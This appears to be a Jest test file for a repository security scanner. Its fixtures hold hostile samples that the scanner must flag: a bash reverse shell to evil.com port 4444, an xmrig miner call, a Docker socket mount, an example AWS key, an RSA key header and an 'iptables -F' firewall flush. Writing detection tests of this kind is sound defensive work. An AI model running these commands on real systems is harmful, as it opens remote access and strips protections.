import { scanRepo } from '../src/scan';
import { mkdtemp, writeFile, rm, mkdir } from 'fs/promises';
import { tmpdir } from 'os';
import { join } from 'path';

// Mock the analyzer module to avoid execa ESM issue
jest.mock('../src/analyzer', () => ({
  analyzePythonAST: jest.fn().mockResolvedValue(null),
  analyzeJS: jest.fn().mockReturnValue([]),
  findHighEntropyStrings: jest.fn().mockReturnValue([]),
  shannonEntropy: jest.fn().mockReturnValue(0),
}));

async function withTempDir(files: Record<string, string>, fn: (dir: string) => Promise<void>) {
  const dir = await mkdtemp(join(tmpdir(), 'wippa-scan-test-'));
  try {
    for (const [path, content] of Object.entries(files)) {
      const fullPath = join(dir, path);
      const parent = fullPath.substring(0, fullPath.lastIndexOf('/'));
      if (parent) await mkdir(parent, { recursive: true }).catch(() => {});
      await writeFile(fullPath, content);
    }
    await fn(dir);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

describe('scanRepo', () => {
  it('passes a clean repo', async () => {
    await withTempDir({
      'main.py': 'print("hello world")\n',
      'README.md': '# clean\n',
    }, async (dir) => {
      const result = await scanRepo(dir);
      expect(result.passed).toBe(true);
      expect(result.findings).toHaveLength(0);
    });
  });

  it('detects cryptominer references', async () => {
    await withTempDir({
      'script.sh': './xmrig --config pool.example.com\n',
    }, async (dir) => {
      const result = await scanRepo(dir);
      expect(result.passed).toBe(false);
      expect(result.findings.some(f => f.description.includes('Cryptominer'))).toBe(true);
    });
  });

  it('detects reverse shell patterns', async () => {
    await withTempDir({
      'exploit.py': 'import os\nos.system("bash -i >& /dev/tcp/evil.com/4444 0>&1")\n',
    }, async (dir) => {
      const result = await scanRepo(dir);
      expect(result.passed).toBe(false);
      expect(result.findings.some(f => f.description.includes('Reverse shell'))).toBe(true);
    });
  });

  it('detects Docker socket access', async () => {
    await withTempDir({
      'deploy.sh': 'docker run -v /var/run/docker.sock:/var/run/docker.sock ...\n',
    }, async (dir) => {
      const result = await scanRepo(dir);
      expect(result.passed).toBe(false);
      expect(result.findings.some(f => f.description.includes('Docker socket'))).toBe(true);
    });
  });

  it('detects hardcoded cloud credentials', async () => {
    await withTempDir({
      'config.py': 'AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"\n',
    }, async (dir) => {
      const result = await scanRepo(dir);
      expect(result.passed).toBe(false);
      expect(result.findings.some(f => f.description.includes('Hardcoded cloud'))).toBe(true);
    });
  });

  it('detects embedded SSH keys', async () => {
    await withTempDir({
      'id_rsa': '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n',
    }, async (dir) => {
      const result = await scanRepo(dir);
      expect(result.passed).toBe(false);
      expect(result.findings.some(f => f.description.includes('SSH key'))).toBe(true);
    });
  });

  it('skips node_modules and .git directories', async () => {
    await withTempDir({
      'node_modules/bad/xmrig': 'xmrig\n',
      '.git/objects/abc': 'xmrig\n',
      'src/main.py': 'print("clean")\n',
    }, async (dir) => {
      const result = await scanRepo(dir);
      expect(result.passed).toBe(true);
    });
  });

  it('detects firewall manipulation attempts', async () => {
    await withTempDir({
      'setup.sh': 'iptables -F\n',
    }, async (dir) => {
      const result = await scanRepo(dir);
      expect(result.passed).toBe(false);
      expect(result.findings.some(f => f.description.includes('Firewall'))).toBe(true);
    });
  });

  it('only blocks on high severity findings, allows medium', async () => {
    await withTempDir({
      'harden.sh': 'chmod 777 /tmp/script.sh\n',
    }, async (dir) => {
      const result = await scanRepo(dir);
      expect(result.passed).toBe(true);
      expect(result.findings.some(f => f.description.includes('permissive'))).toBe(true);
    });
  });
});
